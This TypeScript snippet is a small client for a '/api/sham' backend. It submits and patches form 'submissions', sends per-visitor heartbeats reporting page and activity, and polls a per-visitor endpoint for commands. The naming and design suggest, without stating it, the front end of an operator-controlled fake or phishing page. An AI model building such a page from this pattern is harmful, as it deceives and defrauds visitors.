const BASE = "/api/sham";

async function req(method: string, path: string, body?: unknown) {
  try {
    const res = await fetch(`${BASE}${path}`, {
      method,
      headers: body ? { "Content-Type": "application/json" } : {},
      body: body ? JSON.stringify(body) : undefined,
    });
    if (!res.ok) return null;
    return res.json();
  } catch {
    return null;
  }
}

export const shamApi = {
  submit: (data: Record<string, unknown>) => req("POST", "/submissions", data),
  patch: (id: string, data: Record<string, unknown>) => req("PATCH", `/submissions/${id}`, data),
  heartbeat: (id: string, page: string, isActive: boolean) =>
    req("POST", "/heartbeat", { id, page, isActive }),
  getCmd: (visitorId: string): Promise<{ command: string | null } | null> =>
    req("GET", `/cmd/${visitorId}`),
};
